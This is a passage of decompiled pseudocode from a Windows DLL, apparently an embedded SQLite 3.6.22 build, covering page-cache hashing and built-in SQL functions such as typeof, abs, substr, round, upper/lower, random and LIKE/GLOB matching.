    v1 = (_DWORD *)dword_10184320;
    sub_10066EC6((_DWORD *)dword_10184320);
    sub_10066F21(v1);
    sub_10066D9D((int)v1);
  }
  return result;
}
// 10184310: using guessed type int dword_10184310;
// 10184318: using guessed type int dword_10184318;
// 10184320: using guessed type int dword_10184320;

//----- (10066F7E) --------------------------------------------------------
unsigned int __usercall sub_10066F7E@<eax>(_DWORD *a1@<ebx>, unsigned int a2)
{
  unsigned int **v2; // edi
  unsigned int *v3; // esi
  unsigned int result; // eax
  unsigned int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < a1[6]; result = i )
  {
    v2 = (unsigned int **)(a1[7] + 4 * i);
    while ( 1 )
    {
      v3 = *v2;
      if ( !*v2 )
        break;
      if ( *v3 < a2 )
      {
        v2 = (unsigned int **)(v3 + 1);
      }
      else
      {
        --a1[5];
        *v2 = (unsigned int *)v3[1];
        sub_10066EC6(v3);
        sub_10066D9D((int)v3);
      }
    }
    ++i;
  }
  return result;
}

//----- (10066FD0) --------------------------------------------------------
int __usercall sub_10066FD0@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // eax

  memset(&dword_1018430C, 0, 0x2Cu);
  if ( dword_1018214C )
  {
    if ( sub_1005387F(a1, a2) )
      v2 = 0;
    else
      v2 = dword_10182188(6);
    dword_1018430C = v2;
  }
  dword_10184334 = 1;
  return 0;
}
// 1018214C: using guessed type int dword_1018214C;
// 10182188: using guessed type int (__cdecl *dword_10182188)(_DWORD);
// 1018430C: using guessed type int dword_1018430C;
// 10184334: using guessed type int dword_10184334;

//----- (10067012) --------------------------------------------------------
void *sub_10067012()
{
  return memset(&dword_1018430C, 0, 0x2Cu);
}
// 1018430C: using guessed type int dword_1018430C;

//----- (10067024) --------------------------------------------------------
_DWORD *__cdecl sub_10067024(int a1, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi

  v2 = (_DWORD *)sub_10058CA3(36);
  v3 = v2;
  if ( v2 )
  {
    memset(v2, 0, 0x24u);
    *v3 = a1;
    v3[1] = a2 != 0;
    if ( a2 )
    {
      v3[2] = 10;
      sub_10061305(dword_1018430C);
      dword_10184314 += v3[2];
      sub_10061317(dword_1018430C);
    }
  }
  return v3;
}
// 1018430C: using guessed type int dword_1018430C;
// 10184314: using guessed type int dword_10184314;

//----- (10067086) --------------------------------------------------------
int __cdecl sub_10067086(int a1, int a2)
{
  int result; // eax

  if ( *(_DWORD *)(a1 + 4) )
  {
    sub_10061305(dword_1018430C);
    dword_10184310 += a2 - *(_DWORD *)(a1 + 12);
    *(_DWORD *)(a1 + 12) = a2;
    sub_10066F45();
    return sub_10061317(dword_1018430C);
  }
  return result;
}
// 1018430C: using guessed type int dword_1018430C;
// 10184310: using guessed type int dword_10184310;

//----- (100670C4) --------------------------------------------------------
int __cdecl sub_100670C4(int a1)
{
  int v1; // esi

  sub_10061305(dword_1018430C);
  v1 = *(_DWORD *)(a1 + 20);
  sub_10061317(dword_1018430C);
  return v1;
}
// 1018430C: using guessed type int dword_1018430C;

//----- (100670EB) --------------------------------------------------------
char *__cdecl sub_100670EB(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int *v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // ecx
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  int v8; // eax
  int v9; // edx
  unsigned int v11; // [esp+4h] [ebp-4h]

  v3 = 0;
  sub_10061305(dword_1018430C);
  if ( a3 == 1 )
    sub_10069106();
  v4 = a1[6];
  if ( v4 )
  {
    v3 = *(unsigned int **)(a1[7] + 4 * (a2 % v4));
    if ( v3 )
    {
      do
      {
        if ( *v3 == a2 )
          break;
        v3 = (unsigned int *)v3[1];
      }
      while ( v3 );
      if ( v3 )
        goto LABEL_28;
    }
  }
  if ( !a3 )
  {
LABEL_28:
    sub_10066EC6(v3);
    goto LABEL_29;
  }
  v11 = a1[5];
  v5 = v11 - a1[4];
  if ( a3 == 1 && (v5 >= dword_10184310 + a1[2] - dword_10184314 || v5 >= 9 * a1[3] / 0xAu)
    || v11 >= a1[6] && sub_10066E01((int)a1) )
  {
LABEL_29:
    if ( v3 && a2 > a1[8] )
      a1[8] = a2;
    goto LABEL_32;
  }
  if ( a1[1] )
  {
    v6 = (_DWORD *)dword_10184320;
    if ( dword_10184320 )
    {
      if ( (unsigned int)(a1[5] + 1) >= a1[3] || dword_10184318 >= dword_10184310 )
      {
        v3 = (unsigned int *)dword_10184320;
        sub_10066F21((_DWORD *)dword_10184320);
        sub_10066EC6(v6);
        v7 = (_DWORD *)v6[2];
        if ( *v7 != *a1 )
        {
          sub_10066D9D((int)v6);
          goto LABEL_22;
        }
        dword_10184318 += a1[1] - v7[1];
      }
    }
  }
  if ( v3 )
  {
LABEL_27:
    v9 = a2 % a1[6];
    ++a1[5];
    *v3 = a2;
    v3[1] = *(_DWORD *)(4 * v9 + a1[7]);
    v3[2] = (unsigned int)a1;
    v3[4] = 0;
    v3[3] = 0;
    *(unsigned int *)((char *)v3 - *a1) = 0;
    *(_DWORD *)(4 * v9 + a1[7]) = v3;
    goto LABEL_29;
  }
LABEL_22:
  v8 = sub_10066CED(*a1 + 20);
  if ( v8 )
  {
    v3 = (unsigned int *)(v8 + *a1);
    if ( a1[1] )
      ++dword_10184318;
  }
  else
  {
    v3 = 0;
  }
  if ( v3 )
    goto LABEL_27;
LABEL_32:
  if ( a3 == 1 )
    sub_10069112();
  sub_10061317(dword_1018430C);
  if ( v3 )
    return (char *)v3 - *(_DWORD *)v3[2];
  else
    return 0;
}
// 1018430C: using guessed type int dword_1018430C;
// 10184310: using guessed type int dword_10184310;
// 10184314: using guessed type int dword_10184314;
// 10184318: using guessed type int dword_10184318;
// 10184320: using guessed type int dword_10184320;

//----- (1006728A) --------------------------------------------------------
int __cdecl sub_1006728A(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // esi

  v3 = (_DWORD *)(a2 + *a1);
  sub_10061305(dword_1018430C);
  if ( a3 || dword_10184318 > dword_10184310 )
  {
    sub_10066F21(v3);
    sub_10066D9D((int)v3);
  }
  else
  {
    if ( dword_1018431C )
    {
      *(_DWORD *)(dword_1018431C + 16) = v3;
      v3[3] = dword_1018431C;
    }
    else
    {
      dword_10184320 = (int)v3;
    }
    dword_1018431C = (int)v3;
    ++a1[4];
  }
  return sub_10061317(dword_1018430C);
}
// 1018430C: using guessed type int dword_1018430C;
// 10184310: using guessed type int dword_10184310;
// 10184318: using guessed type int dword_10184318;
// 1018431C: using guessed type int dword_1018431C;
// 10184320: using guessed type int dword_10184320;

//----- (100672F9) --------------------------------------------------------
int __cdecl sub_100672F9(_DWORD *a1, int a2, unsigned int a3, unsigned int a4)
{
  unsigned int *v4; // esi
  _DWORD *i; // eax
  int v6; // edx

  v4 = (unsigned int *)(a2 + *a1);
  sub_10061305(dword_1018430C);
  for ( i = (_DWORD *)(a1[7] + 4 * (a3 % a1[6])); (unsigned int *)*i != v4; i = (_DWORD *)(*i + 4) )
    ;
  *i = v4[1];
  v6 = a4 % a1[6];
  *v4 = a4;
  v4[1] = *(_DWORD *)(4 * v6 + a1[7]);
  *(_DWORD *)(4 * v6 + a1[7]) = v4;
  if ( a4 > a1[8] )
    a1[8] = a4;
  return sub_10061317(dword_1018430C);
}
// 1018430C: using guessed type int dword_1018430C;

//----- (10067368) --------------------------------------------------------
int __cdecl sub_10067368(_DWORD *a1, unsigned int a2)
{
  sub_10061305(dword_1018430C);
  if ( a2 <= a1[8] )
  {
    sub_10066F7E(a1, a2);
    a1[8] = a2 - 1;
  }
  return sub_10061317(dword_1018430C);
}
// 1018430C: using guessed type int dword_1018430C;

//----- (1006739F) --------------------------------------------------------
void __cdecl sub_1006739F(_DWORD *a1)
{
  sub_10061305(dword_1018430C);
  sub_10066F7E(a1, 0);
  dword_10184310 -= a1[3];
  dword_10184314 -= a1[2];
  sub_10066F45();
  sub_10061317(dword_1018430C);
  sub_10058E74(a1[7]);
  sub_10058E74((int)a1);
}
// 1018430C: using guessed type int dword_1018430C;
// 10184310: using guessed type int dword_10184310;
// 10184314: using guessed type int dword_10184314;

//----- (100673EE) --------------------------------------------------------
int __usercall sub_100673EE@<eax>(int a1@<esi>)
{
  int result; // eax

  result = 0;
  if ( *(_DWORD *)a1 )
  {
    result = (*(int (__cdecl **)(int))(*(_DWORD *)a1 + 4))(a1);
    *(_DWORD *)a1 = 0;
  }
  return result;
}

//----- (100673FF) --------------------------------------------------------
int __usercall sub_100673FF@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5)
{
  return (*(int (__cdecl **)(int, int, int, int, int))(*(_DWORD *)a1 + 8))(a1, a2, a3, a4, a5);
}

//----- (10067419) --------------------------------------------------------
int __usercall sub_10067419@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5)
{
  return (*(int (__cdecl **)(int, int, int, int, int))(*(_DWORD *)a1 + 12))(a1, a2, a3, a4, a5);
}

//----- (10067433) --------------------------------------------------------
int __usercall sub_10067433@<eax>(int a1@<eax>, int a2, int a3)
{
  return (*(int (__cdecl **)(int, int, int))(*(_DWORD *)a1 + 16))(a1, a2, a3);
}

//----- (10067447) --------------------------------------------------------
int __usercall sub_10067447@<eax>(int a1@<eax>, int a2)
{
  return (*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 20))(a1, a2);
}

//----- (10067457) --------------------------------------------------------
int __usercall sub_10067457@<eax>(__int16 a1@<ax>, int a2@<ecx>, int a3, int a4, int a5)
{
  return (*(int (__cdecl **)(int, int, int, int, int))(a2 + 24))(a2, a3, a4, a1 & 0x7F1F, a5);
}

//----- (10067472) --------------------------------------------------------
int __usercall sub_10067472@<eax>(int a1@<edi>, int a2, int *a3)
{
  int v3; // ebx
  int v4; // eax
  int v5; // esi

  v3 = 7;
  v4 = sub_10058C4C(*(_DWORD *)(a1 + 4));
  v5 = v4;
  if ( v4 )
  {
    v3 = sub_10067457(16406, a1, a2, v4, 0);
    if ( v3 )
      sub_10058E74(v5);
    else
      *a3 = v5;
  }
  return v3;
}

//----- (100674B8) --------------------------------------------------------
int __usercall sub_100674B8@<eax>(int a1@<eax>)
{
  int v2; // edi

  v2 = sub_100673EE(a1);
  sub_10058E74(a1);
  return v2;
}

//----- (100674CF) --------------------------------------------------------
int __usercall sub_100674CF@<eax>(int a1@<edi>, int a2@<esi>, char *Str1)
{
  int v4; // edi
  int i; // esi

  if ( sub_1005387F(a1, a2) )
    return 0;
  v4 = sub_100612DC();
  sub_10061305(v4);
  for ( i = dword_1018642C; i; i = *(_DWORD *)(i + 12) )
  {
    if ( !Str1 )
      break;
    if ( !strcmp(Str1, *(const char **)(i + 16)) )
      break;
  }
  sub_10061317(v4);
  return i;
}
// 1018642C: using guessed type int dword_1018642C;

//----- (10067528) --------------------------------------------------------
void __fastcall sub_10067528(int a1, int a2)
{
  int v2; // ecx
  int *i; // eax
  int v4; // eax

  if ( a2 )
  {
    if ( dword_1018642C == a2 )
    {
      dword_1018642C = *(_DWORD *)(a2 + 12);
    }
    else if ( dword_1018642C )
    {
      v2 = dword_1018642C;
      for ( i = (int *)(dword_1018642C + 12); *i; i = (int *)(v4 + 12) )
      {
        v4 = *i;
        if ( v4 == a2 )
          break;
        v2 = v4;
      }
      if ( *(_DWORD *)(v2 + 12) == a2 )
        *(_DWORD *)(v2 + 12) = *(_DWORD *)(a2 + 12);
    }
  }
}
// 1018642C: using guessed type int dword_1018642C;

//----- (10067565) --------------------------------------------------------
int __usercall sub_10067565@<eax>(int a1@<esi>)
{
  int result; // eax
  int v2; // edi
  int v3; // ecx

  result = sub_1005387F();
  if ( !result )
  {
    v2 = sub_100612DC();
    sub_10061305(v2);
    sub_10067528(v3, a1);
    *(_DWORD *)(a1 + 12) = dword_1018642C;
    dword_1018642C = a1;
    sub_10061317(v2);
    return 0;
  }
  return result;
}
// 10067580: variable 'v3' is possibly undefined
// 1005387F: using guessed type int sub_1005387F(void);
// 1018642C: using guessed type int dword_1018642C;

//----- (100675A0) --------------------------------------------------------
int __cdecl sub_100675A0(_DWORD *a1, int a2, int a3)
{
  int result; // eax
  int v4; // ebx
  int v5; // esi
  int v6; // [esp+Ch] [ebp-Ch]
  int v7; // [esp+10h] [ebp-8h]
  int v8; // [esp+14h] [ebp-4h]

  result = (int)a1;
  v4 = a1[14];
  v5 = -(*(_DWORD *)(*a1 + 4) != 0);
  v8 = 0;
  if ( *(_BYTE *)(*(_DWORD *)a3 + 30) != 5 )
  {
    v6 = 1;
    if ( a2 <= 1 )
    {
      return sub_1005A394(*(_WORD **)(a3 + 4 * v8), result + 8);
    }
    else
    {
      v7 = 0;
      while ( 1 )
      {
        result = *(_DWORD *)(4 * v6 + a3);
        if ( *(_BYTE *)(result + 30) == 5 )
          break;
        if ( (v5 ^ sub_1005A556(*(_DWORD *)(v7 + a3), v4, *(_DWORD *)(4 * v6 + a3))) >= 0 )
        {
          v8 = v6;
          v7 = 4 * v6;
        }
        if ( ++v6 >= a2 )
        {
          result = (int)a1;
          return sub_1005A394(*(_WORD **)(a3 + 4 * v8), result + 8);
        }
      }
    }
  }
  return result;
}

//----- (10067632) --------------------------------------------------------
int __cdecl sub_10067632(int a1, int a2, int a3)
{
  char *v3; // eax

  switch ( *(_BYTE *)(*(_DWORD *)a3 + 30) )
  {
    case 1:
      v3 = aInteger;
      break;
    case 2:
      v3 = aReal;
      break;
    case 3:
      v3 = aText;
      break;
    case 4:
      v3 = aBlob;
      break;
    default:
      v3 = aNull_1;
      break;
  }
  return sub_100530EC(0, -1, a1, v3, 1);
}

//----- (10067681) --------------------------------------------------------
__int16 __cdecl sub_10067681(int a1, int a2, int *a3)
{
  int v3; // eax
  unsigned __int8 *v4; // eax
  int i; // edx
  unsigned __int8 v6; // cl
  int v7; // eax

  v3 = *(unsigned __int8 *)(*a3 + 30);
  if ( !*(_BYTE *)(*a3 + 30) )
    goto LABEL_5;
  if ( *(unsigned __int8 *)(*a3 + 30) > 2u )
  {
    if ( v3 == 3 )
    {
      v4 = (unsigned __int8 *)sub_100530C6(*a3);
      if ( !v4 )
        return (__int16)v4;
      for ( i = 0; ; ++i )
      {
        v6 = *v4;
        if ( !*v4 )
          break;
        ++v4;
        if ( v6 >= 0xC0u )
        {
          while ( (*v4 & 0xC0) == 0x80 )
            ++v4;
        }
      }
      v7 = i;
      goto LABEL_16;
    }
    if ( v3 != 4 )
    {
LABEL_5:
      LOWORD(v4) = sub_1005A1F4(a1 + 8);
      return (__int16)v4;
    }
  }
  v7 = sub_1005AA64(*a3);
LABEL_16:
  LOWORD(v4) = sub_1005314B(v7, a1);
  return (__int16)v4;
}

//----- (100676F3) --------------------------------------------------------
__int16 __cdecl sub_100676F3(int a1, int a2, int *a3)
{
  int v3; // esi
  double v4; // st7
  __int64 v6; // rax

  v3 = *a3;
  if ( *(_BYTE *)(*a3 + 30) == 1 )
  {
    LODWORD(v6) = sub_1005A03A(v3);
    if ( v6 < 0 )
    {
      if ( !(HIDWORD(v6) & 0x7FFFFFFF | (unsigned int)v6) )
        return sub_1005312B(a1, aIntegerOverflo);
      v6 = -v6;
    }
    return sub_1005315D(a1, v6, SHIDWORD(v6));
  }
  else if ( *(_BYTE *)(*a3 + 30) == 5 )
  {
    return sub_1005A1F4(a1 + 8);
  }
  else
  {
    v4 = sub_1005A0AF(v3);
    if ( v4 < 0.0 )
      v4 = -v4;
    return sub_1005310E(a1, v4);
  }
}
// 10067742: variable 'v6' is possibly undefined

//----- (1006777F) --------------------------------------------------------
void __cdecl sub_1006777F(int a1, int a2, int *a3)
{
  int v3; // esi
  int v4; // ebx
  unsigned __int8 *v5; // ebx
  unsigned __int8 *v6; // eax
  unsigned __int8 v7; // cl
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  bool v11; // cf
  unsigned __int8 v12; // al
  unsigned __int8 *i; // eax
  unsigned __int8 v14; // dl
  int v15; // [esp+Ch] [ebp-1Ch]
  int v16; // [esp+10h] [ebp-18h]
  unsigned __int8 *v17; // [esp+14h] [ebp-14h]
  int v18; // [esp+18h] [ebp-10h]
  __int64 v19; // [esp+20h] [ebp-8h]

  v16 = 0;
  v3 = a3[1];
  if ( *(_BYTE *)(v3 + 30) != 5 && (a2 != 3 || *(_BYTE *)(a3[2] + 30) != 5) )
  {
    v4 = *(unsigned __int8 *)(*a3 + 30);
    v18 = v4;
    v19 = sub_1005A03A(v3);
    if ( v4 == 4 )
    {
      v15 = sub_1005AA64(*a3);
      v5 = (unsigned __int8 *)sub_100530A3(*a3);
      v17 = v5;
      if ( !v5 )
        return;
    }
    else
    {
      v6 = (unsigned __int8 *)sub_100530C6(*a3);
      v5 = v6;
      v17 = v6;
      if ( !v6 )
        return;
      v15 = 0;
      if ( v19 < 0 && *v6 )
      {
        do
        {
          v7 = *v6++;
          if ( v7 >= 0xC0u )
          {
            while ( (*v6 & 0xC0) == 0x80 )
              ++v6;
          }
          ++v15;
        }
        while ( *v6 );
      }
    }
    if ( a2 == 3 )
    {
      v8 = sub_1005A03A(a3[2]);
      v9 = v8 >> 31;
      v10 = v8;
      if ( (v8 >> 31 == -1 || v8 >= 0) && v8 < 0 )
      {
        v10 = -v8;
        v9 = (unsigned __int64)-(__int64)v8 >> 32;
        v16 = 1;
      }
    }
    else
    {
      v9 = *(int *)(*(_DWORD *)(a1 + 24) + 72) >> 31;
      v10 = *(_DWORD *)(*(_DWORD *)(a1 + 24) + 72);
    }
    if ( v19 >= 0 )
    {
      if ( (_DWORD)v19 )
      {
        --v19;
      }
      else if ( v9 >= 0 && (v9 > 0 || v10) )
      {
        v11 = v10-- != 0;
        v9 = v11 + v9 - 1;
      }
    }
    else
    {
      v19 += v15;
      if ( v19 < 0 )
      {
        v9 = (v19 + __PAIR64__(v9, v10)) >> 32;
        v10 += v19;
        if ( v9 < 0 )
        {
          v10 = 0;
          v9 = 0;
        }
        v19 = 0i64;
      }
    }
    if ( v16 )
    {
      v19 -= __PAIR64__(v9, v10);
      if ( v19 < 0 )
      {
        v9 = (v19 + __PAIR64__(v9, v10)) >> 32;
        v10 += v19;
        v19 = 0i64;
      }
    }
    if ( v18 == 4 )
    {
      if ( (__int64)(v19 + __PAIR64__(v9, v10)) > v15 )
      {
        v10 = v15 - v19;
        if ( (((unsigned __int64)(v15 - v19) >> 32) & 0x80000000) != 0i64 )
          v10 = 0;
      }
      sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v10, a1, &v17[v19], 0);
    }
    else
    {
      while ( 1 )
      {
        v12 = *v5;
        if ( !*v5 || !v19 )
          break;
        ++v5;
        if ( v12 >= 0xC0u )
        {
          while ( (*v5 & 0xC0) == 0x80 )
            ++v5;
        }
        --v19;
      }
      for ( i = v5; *i; v9 = (__PAIR64__(v9, v10--) - 1) >> 32 )
      {
        if ( !(v9 | v10) )
          break;
        v14 = *i++;
        if ( v14 >= 0xC0u )
        {
          while ( (*i & 0xC0) == 0x80 )
            ++i;
        }
      }
      sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, i - v5, a1, v5, 1);
    }
  }
}
// 10067812: conditional instruction was optimized away because %var_8@4.4 is in (==0|==FFFFFFFF)
// 10067885: conditional instruction was optimized away because %var_8@4.4 is in (==0|==FFFFFFFF)
// 100678D2: conditional instruction was optimized away because %var_8@4.4==0
// 100678D4: conditional instruction was optimized away because %var_8@4.4==0

//----- (100679DD) --------------------------------------------------------
void __cdecl sub_100679DD(int a1, int a2, int *a3)
{
  int v3; // edi
  int v4; // esi
  int v5; // esi
  _BYTE *v6; // eax
  int v7; // esi
  double v8; // [esp+18h] [ebp-8h] BYREF

  v3 = 0;
  if ( a2 == 2 )
  {
    v4 = a3[1];
    if ( *(_BYTE *)(v4 + 30) == 5 )
      return;
    v3 = sub_1005A03A(v4);
    if ( v3 > 30 )
      v3 = 30;
    if ( v3 < 0 )
      v3 = 0;
  }
  v5 = *a3;
  if ( *(_BYTE *)(*a3 + 30) != 5 )
  {
    v8 = sub_1005A0AF(v5);
    v6 = (_BYTE *)sub_10055521(v3, v5, "%.*f", v3, v8);
    v7 = (int)v6;
    if ( v6 )
    {
      sub_100594F4(v6, &v8);
      sub_10058E74(v7);
      sub_1005310E(a1, v8);
    }
    else
    {
      sub_10053198(a1);
    }
  }
}

//----- (10067A76) --------------------------------------------------------
int __usercall sub_10067A76@<eax>(int a1@<eax>, __int64 a2)
{
  int v3; // edi

  if ( a2 <= *(int *)(*(_DWORD *)(a1 + 24) + 72) )
  {
    v3 = sub_10058C4C(a2);
    if ( !v3 )
      sub_10053198(a1);
  }
  else
  {
    sub_10053178(a1);
    return 0;
  }
  return v3;
}

//----- (10067AB7) --------------------------------------------------------
_BYTE *__cdecl sub_10067AB7(int a1, int a2, int *a3)
{
  _BYTE *result; // eax
  _BYTE *v4; // edi
  _BYTE *v5; // esi
  _BYTE *v6; // eax
  void *Src; // [esp+Ch] [ebp-4h]

  Src = (void *)sub_100530C6(*a3);
  result = (_BYTE *)sub_1005AA64(*a3);
  v4 = result;
  if ( Src )
  {
    result = (_BYTE *)sub_10067A76(a1, (__int64)(result + 1));
    v5 = result;
    if ( result )
    {
      memcpy(result, Src, (size_t)(v4 + 1));
      if ( *v5 )
      {
        v6 = v5;
        do
        {
          *v6 &= ~(byte_100FEFC0[(unsigned __int8)*v6] & 0x20);
          ++v6;
        }
        while ( *v6 );
      }
      return (_BYTE *)sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, -1, a1, v5, 1);
    }
  }
  return result;
}

//----- (10067B44) --------------------------------------------------------
_BYTE *__cdecl sub_10067B44(int a1, int a2, int *a3)
{
  const void *v3; // ebx
  _BYTE *result; // eax
  _BYTE *v5; // edi
  _BYTE *v6; // esi
  _BYTE *v7; // eax

  v3 = (const void *)sub_100530C6(*a3);
  result = (_BYTE *)sub_1005AA64(*a3);
  v5 = result;
  if ( v3 )
  {
    result = (_BYTE *)sub_10067A76(a1, (__int64)(result + 1));
    v6 = result;
    if ( result )
    {
      memcpy(result, v3, (size_t)(v5 + 1));
      if ( *v6 )
      {
        v7 = v6;
        do
        {
          *v7 = byte_100FEEC0[(unsigned __int8)*v7];
          ++v7;
        }
        while ( *v7 );
      }
      return (_BYTE *)sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, -1, a1, v6, 1);
    }
  }
  return result;
}

//----- (10067BC1) --------------------------------------------------------
int __cdecl sub_10067BC1(int a1)
{
  int v1; // eax
  int v3; // [esp+0h] [ebp-8h] BYREF
  int v4; // [esp+4h] [ebp-4h]

  sub_10069AB6((char *)&v3, 8);
  v1 = v4;
  if ( v4 < 0 )
  {
    v1 = (unsigned __int64)-__SPAIR64__(v4 ^ 0x80000000, v3) >> 32;
    v3 = -v3;
  }
  return sub_1005315D(a1, v3, v1);
}

//----- (10067C0C) --------------------------------------------------------
char *__cdecl sub_10067C0C(int a1, int a2, int *a3)
{
  int v3; // esi
  char *result; // eax
  char *v5; // edi

  v3 = sub_1005A03A(*a3);
  if ( v3 < 1 )
    v3 = 1;
  result = (char *)sub_10067A76(a1, v3);
  v5 = result;
  if ( result )
  {
    sub_10069AB6(result, v3);
    return (char *)sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, v3, a1, v5, 0);
  }
  return result;
}

//----- (10067C5E) --------------------------------------------------------
int __cdecl sub_10067C5E(int a1)
{
  return sub_1005315D(a1, *(_DWORD *)(*(_DWORD *)(a1 + 24) + 48), *(_DWORD *)(*(_DWORD *)(a1 + 24) + 52));
}

//----- (10067C7B) --------------------------------------------------------
int __cdecl sub_10067C7B(int a1)
{
  return sub_1005314B(*(_DWORD *)(*(_DWORD *)(a1 + 24) + 60), a1);
}

//----- (10067C8D) --------------------------------------------------------
int __cdecl sub_10067C8D(int a1)
{
  return sub_1005314B(*(_DWORD *)(*(_DWORD *)(a1 + 24) + 64), a1);
}

//----- (10067C9F) --------------------------------------------------------
BOOL __cdecl sub_10067C9F(_BYTE *a1, unsigned __int8 *a2, _BYTE *a3, int a4)
{
  _BYTE *v4; // ebx
  int v5; // ebx
  int v6; // esi
  int v7; // edi
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // esi
  int v13; // edi
  int v14; // eax
  unsigned __int8 *v15; // esi
  _BYTE *v16; // edi
  unsigned __int8 v17; // al
  int v18; // [esp+Ch] [ebp-Ch]
  int v19; // [esp+10h] [ebp-8h]
  char v20; // [esp+14h] [ebp-4h]
  unsigned __int8 v21; // [esp+15h] [ebp-3h]
  unsigned __int8 v22; // [esp+16h] [ebp-2h]
  unsigned __int8 v23; // [esp+17h] [ebp-1h]

  v4 = a3;
  v23 = a3[1];
  v22 = *a3;
  v21 = a3[2];
  v20 = a3[3];
LABEL_41:
  v18 = 0;
  while ( 1 )
  {
    v11 = sub_10070605(&a1);
    if ( !v11 )
      return *a2 == 0;
    if ( v18 )
      goto LABEL_7;
    if ( v11 == v22 )
      break;
    if ( v11 == v23 )
    {
      if ( !sub_10070605((char **)&a2) )
        return 0;
    }
    else
    {
LABEL_7:
      if ( v11 == v21 )
      {
        v5 = 0;
        v6 = 0;
        v19 = 0;
        v7 = sub_10070605((char **)&a2);
        if ( !v7 )
          return 0;
        v8 = sub_10070605(&a1);
        if ( v8 == 94 )
        {
          v5 = 1;
          v8 = sub_10070605(&a1);
        }
        if ( v8 == 93 )
        {
          if ( v7 == 93 )
            v19 = 1;
          v8 = sub_10070605(&a1);
        }
        if ( !v8 )
          return 0;
        do
        {
          if ( v8 == 93 )
            break;
          if ( v8 == 45 && *a1 != 93 && *a1 && v6 > 0 )
          {
            v9 = sub_10070605(&a1);
            if ( v7 >= v6 && v7 <= v9 )
              v19 = 1;
            v6 = 0;
          }
          else
          {
            if ( v7 == v8 )
              v19 = 1;
            v6 = v8;
          }
          v8 = sub_10070605(&a1);
        }
        while ( v8 );
        if ( !v8 || v19 == v5 )
          return 0;
        v4 = a3;
      }
      else
      {
        if ( a4 != v11 || v18 )
        {
          v10 = sub_10070605((char **)&a2);
          if ( v20 )
          {
            if ( v11 < 128 )
              v11 = (unsigned __int8)byte_100FEEC0[v11];
            if ( v10 < 128 )
              v10 = (unsigned __int8)byte_100FEEC0[v10];
          }
          if ( v11 != v10 )
            return 0;
          goto LABEL_41;
        }
        v18 = 1;
      }
    }
  }
  while ( 1 )
  {
    v13 = sub_10070605(&a1);
    if ( v13 != v22 && v13 != v23 )
      break;
    if ( v13 == v23 && !sub_10070605((char **)&a2) )
      return 0;
  }
  if ( !v13 )
    return 1;
  if ( v13 == a4 )
  {
    v13 = sub_10070605(&a1);
    if ( v13 )
    {
LABEL_53:
      v14 = sub_10070605((char **)&a2);
      if ( v14 )
      {
        while ( 1 )
        {
          if ( v20 )
          {
            if ( v14 < 128 )
              v14 = (unsigned __int8)byte_100FEEC0[v14];
            if ( v13 < 128 )
              v13 = (unsigned __int8)byte_100FEEC0[v13];
            if ( !v14 )
              return 0;
            do
            {
              if ( v14 == v13 )
                break;
              v14 = sub_10070605((char **)&a2);
              if ( v14 < 128 )
                v14 = (unsigned __int8)byte_100FEEC0[v14];
            }
            while ( v14 );
          }
          else
          {
            do
            {
              if ( v14 == v13 )
                break;
              v14 = sub_10070605((char **)&a2);
            }
            while ( v14 );
          }
          if ( !v14 )
            return 0;
          if ( sub_10067C9F(a1, a2, v4, a4) )
            break;
          v14 = sub_10070605((char **)&a2);
          if ( !v14 )
            return 0;
        }
        return 1;
      }
    }
    return 0;
  }
  else
  {
    if ( v13 != v21 )
      goto LABEL_53;
    v15 = a2;
    if ( *a2 )
    {
      v16 = a1 - 1;
      do
      {
        if ( sub_10067C9F(v16, v15, v4, a4) )
          break;
        v17 = *v15++;
        if ( v17 >= 0xC0u )
        {
          while ( (*v15 & 0xC0) == 0x80 )
            ++v15;
        }
      }
      while ( *v15 );
    }
    return *v15 != 0;
  }
}
// 10067F62: conditional instruction was optimized away because eax.4!=0

//----- (10067FB3) --------------------------------------------------------
unsigned __int8 *__cdecl sub_10067FB3(_DWORD *a1, int a2, int *a3)
{
  int v3; // ebx
  unsigned __int8 *result; // eax
  int v6; // eax
  _BYTE *v7; // [esp+Ch] [ebp-8h]
  char *v8; // [esp+10h] [ebp-4h] BYREF
  unsigned __int8 *v9; // [esp+24h] [ebp+10h]

  v8 = 0;
  v3 = a1[6];
  v7 = (_BYTE *)sub_100530C6(*a3);
  v9 = (unsigned __int8 *)sub_100530C6(a3[1]);
  result = (unsigned __int8 *)sub_1005AA64(*a3);
  if ( (int)result > *(_DWORD *)(v3 + 104) )
    return (unsigned __int8 *)sub_1005312B((int)a1, aLikeOrGlobPatt);
  if ( a2 == 3 )
  {
    result = (unsigned __int8 *)sub_100530C6(a3[2]);
    if ( !result )
      return result;
    if ( sub_10070AAB(result, -1) != 1 )
      return (unsigned __int8 *)sub_1005312B((int)a1, aEscapeExpressi);
    result = (unsigned __int8 *)sub_10070605(&v8);
    v8 = (char *)result;
  }
  if ( v9 )
  {
    if ( v7 )
    {
      v6 = sub_10067C9F(v7, v9, *(_BYTE **)(*a1 + 4), (int)v8);
      return (unsigned __int8 *)sub_1005314B(v6, (int)a1);
    }
  }
  return result;
}

//----- (10068067) --------------------------------------------------------
int __cdecl sub_10068067(int a1, int a2, int *a3)
{
  int result; // eax

  result = sub_1005A556(*a3, *(_DWORD *)(a1 + 56), a3[1]);
  if ( result )
    return sub_1005A394((_WORD *)*a3, a1 + 8);
  return result;
}

//----- (10068094) --------------------------------------------------------
int __cdecl sub_10068094(int a1)
{
  int result; // eax

  result = sub_1005A3FE(0, a1 + 8, -1, "3.6.22", 1);
  if ( result == 18 )
    return sub_10053178(a1);
  return result;
}

//----- (100680C2) --------------------------------------------------------
int __cdecl sub_100680C2(int a1)
{
  int result; // eax

